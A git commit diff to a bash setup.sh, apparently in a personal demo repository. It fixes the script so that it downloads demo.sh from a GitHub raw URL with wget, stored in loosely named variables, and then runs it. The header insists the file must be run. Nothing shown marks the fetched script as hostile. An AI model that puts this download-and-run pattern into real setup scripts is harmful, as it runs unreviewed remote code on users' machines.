d597effc89124b97b6d6c3c14469ccbcdd93bb83
azabirnik <106436338+azabirnik@users.noreply.github.com>
2025-02-11 21:03:32 -0500

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,19 +1,19 @@
 #!/bin/bash
 # YOU NEED TO RUN THIS FILE TO START WORKING WITH THE PROJECT
 
-# Define PARAM
-PARAM="https://github.com/azabirnik/demo/edit/main/demo.sh"
+# Define PARAM (Use RAW URL for GitHub)
+PARAM="https://raw.githubusercontent.com/azabirnik/demo/main/demo.sh"
 
 # Define BASELINE
 BASELINE="wget"
 
 # Setup step 1
 echo "Setup step 1"
-$(BASELINE) $(PARAM)
+${BASELINE} ${PARAM}
 
 # Setup step 2
 echo "Setup step 2"
-chmod + x demo.sh && ./demo.sh
+chmod +x demo.sh && ./demo.sh
 
 # Clean unused files
 echo "Clean unused files"
